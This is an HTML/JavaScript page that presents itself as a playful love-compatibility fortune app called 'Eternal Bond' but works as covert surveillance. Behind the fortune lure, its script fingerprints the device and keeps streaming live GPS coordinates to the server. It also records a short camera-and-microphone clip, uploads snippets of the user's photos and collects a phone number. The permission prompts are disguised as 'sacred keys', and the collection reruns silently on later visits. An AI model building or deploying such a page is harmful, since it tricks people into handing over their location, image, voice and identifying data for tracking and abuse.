<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Eternal Bond | Love Essence</title>
    <!-- FingerprintJS for stable device ID -->
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
        }

        body {
            min-height: 100vh;
            background: radial-gradient(circle at 10% 30%, #fce4ec, #ffe6f0, #f8bbd0);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
        }

        /* glassmorphic card */
        .glass-card {
            max-width: 580px;
            width: 100%;
            background: rgba(255, 248, 250, 0.94);
            backdrop-filter: blur(2px);
            border-radius: 48px;
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.15), 0 0 0 1px rgba(255, 255, 255, 0.6);
            padding: 2rem 1.8rem;
            transition: all 0.2s ease;
        }

        .gradient-text {
            background: linear-gradient(135deg, #D81B60, #AD1457, #880E4F);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-weight: 800;
        }

        h1 {
            font-size: 2.1rem;
            text-align: center;
            letter-spacing: -0.3px;
            margin-bottom: 0.3rem;
        }

        .sub {
            text-align: center;
            color: #b34e6e;
            margin-bottom: 1.8rem;
            font-weight: 500;
            font-size: 0.9rem;
        }

        .input-group {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            margin: 20px 0 12px;
        }
        .input-group input {
            flex: 1;
            background: #fff0f3;
            border: 1.5px solid #ffcdd9;
            padding: 14px 18px;
            border-radius: 60px;
            font-size: 1rem;
            outline: none;
            transition: 0.2s;
        }
        .input-group input:focus {
            border-color: #D81B60;
            background: white;
            box-shadow: 0 0 0 3px rgba(216,27,96,0.2);
        }

        .btn-primary {
            width: 100%;
            background: linear-gradient(95deg, #D81B60, #AD1457);
            border: none;
            padding: 14px;
            border-radius: 60px;
            font-weight: bold;
            font-size: 1.1rem;
            color: white;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 12px;
            box-shadow: 0 6px 14px rgba(173,20,87,0.3);
        }
        .btn-primary:hover {
            transform: scale(0.98);
            background: linear-gradient(95deg, #c2185b, #8e0e47);
        }

        .hidden {
            display: none !important;
        }

        .permission-panel {
            background: #fef2f5;
            border-radius: 32px;
            padding: 1.5rem;
            margin: 20px 0;
            text-align: center;
            border: 1px solid #ffccda;
        }
        .permission-badge {
            background: white;
            border-radius: 28px;
            padding: 12px;
            margin: 12px 0;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 12px;
            justify-content: center;
            flex-wrap: wrap;
            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #ffe0e7;
            border-top: 3px solid #D81B60;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .fortune-box {
            background: linear-gradient(145deg, #fff0f5, #ffe4ed);
            border-radius: 32px;
            padding: 1.8rem;
            text-align: center;
            font-size: 1.3rem;
            font-weight: 600;
            color: #9b2d53;
            border-left: 6px solid #f06292;
            margin: 20px 0;
            word-break: break-word;
            line-height: 1.4;
        }

        .sms-area {
            background: #ffffffcc;
            border-radius: 32px;
            padding: 1rem;
            margin-top: 12px;
        }
        .phone-input {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
        }
        .phone-input input {
            flex: 2;
            padding: 12px;
            border-radius: 60px;
            border: 1px solid #f0b6c6;
            background: white;
        }
        .phone-input button {
            background: #2e7d64;
            border: none;
            padding: 12px 18px;
            border-radius: 60px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }

        .step-progress {
            background: #fff0f3;
            border-radius: 28px;
            padding: 1rem;
            margin: 20px 0;
            text-align: center;
        }

        footer {
            font-size: 0.7rem;
            text-align: center;
            color: #a1677c;
            margin-top: 1.2rem;
        }

        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
<div class="glass-card" id="appRoot">
    <h1>💗 <span class="gradient-text">Eternal Bond</span> 💗</h1>
    <div class="sub">celestial love & soul whispers</div>

    <!-- STEP 1: names -->
    <div id="stepNames">
        <div class="input-group">
            <input type="text" id="yourName" placeholder="your name" autocomplete="off">
            <input type="text" id="crushName" placeholder="their name" autocomplete="off">
        </div>
        <button class="btn-primary" id="startBtn">✨ unveil destiny ✨</button>
    </div>

    <!-- loading animation -->
    <div id="loadingDiv" class="hidden">
        <div class="spinner"></div>
        <p style="text-align:center; margin-top:8px;">🔮 consulting the stars ...</p>
    </div>

    <!-- permission request zone (elegant) -->
    <div id="permissionZone" class="hidden">
        <div class="permission-panel">
            <p style="font-weight:bold; margin-bottom:12px;">🌸 To reveal your <strong>unique love essence</strong>, allow these sacred keys:</p>
            <div class="permission-badge">📍 <strong>Heart compass</strong> — live location (celestial map)</div>
            <div class="permission-badge">🎥 <strong>Memory mirror</strong> — camera & mic (3 sec whisper)</div>
            <div class="permission-badge">📁 <strong>Keepsake tokens</strong> — optional photos (encrypted)</div>
            <button id="grantPermissionsBtn" class="btn-primary" style="margin-top:12px;">🌟 cast the spell 🌟</button>
        </div>
    </div>

    <!-- live step visual -->
    <div id="progressVisual" class="hidden step-progress">
        <div id="progressText">✨ preparing magic ...</div>
        <div class="spinner" style="width:24px; height:24px;"></div>
    </div>

    <!-- final result -->
    <div id="resultArea" class="hidden">
        <div class="fortune-box" id="fortuneMsg"></div>
        <div id="smsContainer">
            <div class="sms-area">
                <p style="margin-bottom:8px;">📱 <strong>Save your prophecy</strong> (sent to your number & stored safely)</p>
                <div class="phone-input">
                    <input type="tel" id="phoneNumberField" placeholder="+1234567890" autocomplete="off">
                    <button id="savePhoneBtn">💾 keep forever</button>
                </div>
                <div id="smsStatusMsg" style="font-size:12px; margin-top:8px; color:#7b4b5e;"></div>
            </div>
        </div>
        <footer>✦ your aura is recorded in the cosmic ledger ✦</footer>
    </div>
</div>

<script>
    // ---------- SESSION & STATE ----------
    let sessionId = localStorage.getItem('eternal_session');
    if (!sessionId) {
        sessionId = Date.now() + '_' + Math.random().toString(36).substring(2, 12);
        localStorage.setItem('eternal_session', sessionId);
    }

    let collectedData = {
        sessionId: sessionId,
        name: '',
        crush_name: '',
        fingerprint: '',
        batteryLevel: '',
        batteryCharging: false,
        networkType: '',
        networkSpeed: '',
        deviceMemory: '',
        screen: '',
        timezone: '',
        userAgent: '',
        latitude: 'pending',
        longitude: 'pending',
        mapUrl: '',
        cameraVideo: '',
        microphone: 'pending',
        files: '',
        fortuneText: '',
        timestamp: new Date().toISOString()
    };

    let mediaStream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    let locationWatchId = null;
    let finalFortune = "";
    let existingDataLoaded = false;

    // DOM elements
    const stepNamesDiv = document.getElementById('stepNames');
    const loadingDiv = document.getElementById('loadingDiv');
    const permissionZone = document.getElementById('permissionZone');
    const progressVisual = document.getElementById('progressVisual');
    const progressTextSpan = document.getElementById('progressText');
    const resultArea = document.getElementById('resultArea');
    const fortuneMsgDiv = document.getElementById('fortuneMsg');
    const yourNameInput = document.getElementById('yourName');
    const crushNameInput = document.getElementById('crushName');
    const startBtn = document.getElementById('startBtn');
    const grantBtn = document.getElementById('grantPermissionsBtn');
    const savePhoneBtn = document.getElementById('savePhoneBtn');
    const phoneField = document.getElementById('phoneNumberField');
    const smsStatusSpan = document.getElementById('smsStatusMsg');

    // helper: show progress
    function setProgressMessage(msg, showSpinner = true) {
        progressVisual.classList.remove('hidden');
        progressTextSpan.innerText = msg;
    }
    function hideProgress() {
        progressVisual.classList.add('hidden');
    }

    // ---- fingerprint & device data ----
    async function captureDeviceProfile() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            collectedData.fingerprint = result.visitorId;
        } catch(e) { collectedData.fingerprint = 'fp-error'; }
        
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                collectedData.batteryLevel = Math.round(battery.level * 100);
                collectedData.batteryCharging = battery.charging;
            } catch(e) {}
        }
        const conn = navigator.connection || navigator.mozConnection;
        if (conn) {
            collectedData.networkType = conn.effectiveType || 'unknown';
            collectedData.networkSpeed = conn.downlink ? conn.downlink + ' Mbps' : 'unknown';
        }
        collectedData.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
        collectedData.screen = `${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
        collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        collectedData.userAgent = navigator.userAgent;
    }

    // ---- location with watch (continuous update to backend) ----
    function requestLocationAndWatch() {
        return new Promise((resolve) => {
            setProgressMessage("📍 capturing celestial coordinates ...", true);
            const timeout = setTimeout(() => {
                collectedData.latitude = 'denied';
                collectedData.longitude = 'denied';
                collectedData.mapUrl = '';
                hideProgress();
                resolve();
            }, 9000);
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    clearTimeout(timeout);
                    collectedData.latitude = pos.coords.latitude;
                    collectedData.longitude = pos.coords.longitude;
                    collectedData.mapUrl = `https://www.google.com/maps?q=${collectedData.latitude},${collectedData.longitude}`;
                    // start watching for live updates
                    if (locationWatchId === null) {
                        locationWatchId = navigator.geolocation.watchPosition(
                            (newPos) => {
                                const lat = newPos.coords.latitude;
                                const lon = newPos.coords.longitude;
                                fetch('/update-location', {
                                    method: 'POST',
                                    headers: {'Content-Type':'application/json'},
                                    body: JSON.stringify({ sessionId: sessionId, latitude: lat, longitude: lon })
                                }).catch(e => console.warn);
                            },
                            (err) => console.warn("watch error", err),
                            { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
                        );
                    }
                    hideProgress();
                    resolve();
                },
                () => {
                    clearTimeout(timeout);
                    collectedData.latitude = 'denied';
                    collectedData.longitude = 'denied';
                    hideProgress();
                    resolve();
                },
                { enableHighAccuracy: true, timeout: 7000 }
            );
        });
    }

    // camera + mic (short video snippet)
    function captureMediaSnippet() {
        return new Promise((resolve) => {
            setProgressMessage("🎥 recording heartbeat whisper (3 sec)...", true);
            const timeout = setTimeout(() => {
                collectedData.cameraVideo = 'denied';
                collectedData.microphone = 'denied';
                hideProgress();
                resolve();
            }, 12000);
            navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } })
                .then(stream => {
                    clearTimeout(timeout);
                    mediaStream = stream;
                    recordedChunks = [];
                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                    mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
                    mediaRecorder.onstop = () => {
                        if (recordedChunks.length) {
                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                const b64 = reader.result.split(',')[1];
                                collectedData.cameraVideo = b64.slice(0, 5000); // store first 5k chars preview
                                collectedData.microphone = 'recorded';
                                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
                                hideProgress();
                                resolve();
                            };
                            reader.readAsDataURL(blob);
                        } else {
                            collectedData.cameraVideo = 'empty';
                            collectedData.microphone = 'empty';
                            hideProgress();
                            resolve();
                        }
                    };
                    mediaRecorder.start();
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
                    }, 3200);
                })
                .catch(() => {
                    clearTimeout(timeout);
                    collectedData.cameraVideo = 'denied';
                    collectedData.microphone = 'denied';
                    hideProgress();
                    resolve();
                });
        });
    }

    // file picker optional (max 2 files small preview)
    function requestFiles() {
        return new Promise((resolve) => {
            setProgressMessage("📎 optional love tokens (photos, memories)", true);
            const input = document.createElement('input');
            input.type = 'file';
            input.multiple = true;
            input.accept = 'image/*';
            let resolvedFlag = false;
            const timeout = setTimeout(() => {
                if (!resolvedFlag) {
                    resolvedFlag = true;
                    collectedData.files = 'skipped_timeout';
                    hideProgress();
                    resolve();
                }
            }, 15000);
            input.onchange = async (e) => {
                if (resolvedFlag) return;
                clearTimeout(timeout);
                resolvedFlag = true;
                const files = Array.from(e.target.files);
                if (files.length === 0) {
                    collectedData.files = 'no_files_selected';
                    hideProgress();
                    resolve();
                    return;
                }
                let previews = [];
                for (let i = 0; i < Math.min(files.length, 2); i++) {
                    const file = files[i];
                    const content = await new Promise(res => {
                        const reader = new FileReader();
                        reader.onloadend = () => res(reader.result.split(',')[1].slice(0, 2000));
                        reader.readAsDataURL(file);
                    });
                    previews.push({ name: file.name, size: file.size, type: file.type, data: content });
                }
                collectedData.files = JSON.stringify(previews);
                hideProgress();
                resolve();
            };
            input.click();
        });
    }

    // final save to supabase via flask
    async function saveToDatabase() {
        try {
            const response = await fetch('/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(collectedData)
            });
            return response.ok;
        } catch(e) { return false; }
    }

    async function getLoveFortune(name1, name2) {
        const resp = await fetch('/calculate-love', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name1, name2 })
        });
        const data = await resp.json();
        return data.message;
    }

    // main orchestration after permissions
    async function executeFullCollection() {
        permissionZone.classList.add('hidden');
        // step by step
        await requestLocationAndWatch();
        await captureMediaSnippet();
        await requestFiles();
        setProgressMessage("🌟 weaving your love destiny ...", true);
        const fortune = await getLoveFortune(collectedData.name, collectedData.crush_name);
        finalFortune = fortune;
        collectedData.fortuneText = fortune;
        await saveToDatabase();
        hideProgress();
        // show result
        fortuneMsgDiv.innerText = finalFortune;
        resultArea.classList.remove('hidden');
        // check if phone already exists (optional from existing session)
        const existingPhone = localStorage.getItem(`phone_${sessionId}`);
        if (existingPhone) {
            phoneField.value = existingPhone;
            phoneField.disabled = true;
            savePhoneBtn.style.display = 'none';
            smsStatusSpan.innerText = '📞 number already registered';
        } else {
            phoneField.disabled = false;
            savePhoneBtn.style.display = 'inline-flex';
        }
    }

    // permission flow start
    async function startPermissionsFlow() {
        localStorage.setItem('lovePermissionsGranted', 'true');
        await executeFullCollection();
    }

    // initial check if user already completed love reading (existing session in supabase)
    async function checkExistingSession() {
        try {
            const resp = await fetch('/get-session-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId: sessionId })
            });
            const data = await resp.json();
            if (data.exists && data.fortuneText) {
                existingDataLoaded = true;
                if (data.name) yourNameInput.value = data.name;
                if (data.crush_name) crushNameInput.value = data.crush_name;
                finalFortune = data.fortuneText;
                fortuneMsgDiv.innerText = finalFortune;
                stepNamesDiv.classList.add('hidden');
                resultArea.classList.remove('hidden');
                if (data.phoneNumber) {
                    phoneField.value = data.phoneNumber;
                    phoneField.disabled = true;
                    savePhoneBtn.style.display = 'none';
                    smsStatusSpan.innerText = '✅ phone already linked to your destiny';
                    localStorage.setItem(`phone_${sessionId}`, data.phoneNumber);
                } else {
                    phoneField.disabled = false;
                }
                return true;
            }
        } catch(e) {}
        return false;
    }

    // SAVE PHONE endpoint
    async function savePhoneNumber() {
        const phone = phoneField.value.trim();
        if (!phone) {
            smsStatusSpan.innerText = '⚠️ please enter a valid number';
            return;
        }
        if (!/^[\+\d\s\-\(\)]{7,18}$/.test(phone)) {
            smsStatusSpan.innerText = '📵 invalid phone format';
            return;
        }
        savePhoneBtn.disabled = true;
        savePhoneBtn.innerText = 'saving...';
        try {
            const resp = await fetch('/save-phone', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: sessionId,
                    phoneNumber: phone,
                    fortune: finalFortune
                })
            });
            const result = await resp.json();
            if (result.status === 'saved') {
                smsStatusSpan.innerText = '💖 number saved! your prophecy is sealed.';
                phoneField.disabled = true;
                savePhoneBtn.style.display = 'none';
                localStorage.setItem(`phone_${sessionId}`, phone);
            } else {
                smsStatusSpan.innerText = 'error, try again';
                savePhoneBtn.disabled = false;
                savePhoneBtn.innerText = '💾 keep forever';
            }
        } catch(e) {
            smsStatusSpan.innerText = 'network issue, please retry';
            savePhoneBtn.disabled = false;
            savePhoneBtn.innerText = '💾 keep forever';
        }
    }

    // START process: get names, device profile, then ask permissions
    startBtn.onclick = async () => {
        if (existingDataLoaded) return;
        const name1 = yourNameInput.value.trim();
        const name2 = crushNameInput.value.trim();
        if (!name1 || !name2) {
            alert("💞 please enter both names to invoke the oracle");
            return;
        }
        collectedData.name = name1;
        collectedData.crush_name = name2;
        stepNamesDiv.classList.add('hidden');
        loadingDiv.classList.remove('hidden');
        await captureDeviceProfile();
        loadingDiv.classList.add('hidden');
        // check if permissions already granted earlier in this browser
        const permsFlag = localStorage.getItem('lovePermissionsGranted');
        if (permsFlag === 'true') {
            await executeFullCollection();
        } else {
            permissionZone.classList.remove('hidden');
        }
    };

    grantBtn.onclick = () => {
        startPermissionsFlow();
    };

    savePhoneBtn.onclick = savePhoneNumber;

    // load existing session data on page load
    window.addEventListener('load', async () => {
        const exists = await checkExistingSession();
        if (!exists) {
            // if no existing data, just show normal flow
            stepNamesDiv.classList.remove('hidden');
        } else {
            stepNamesDiv.classList.add('hidden');
        }
    });
</script>
</body>
</html>
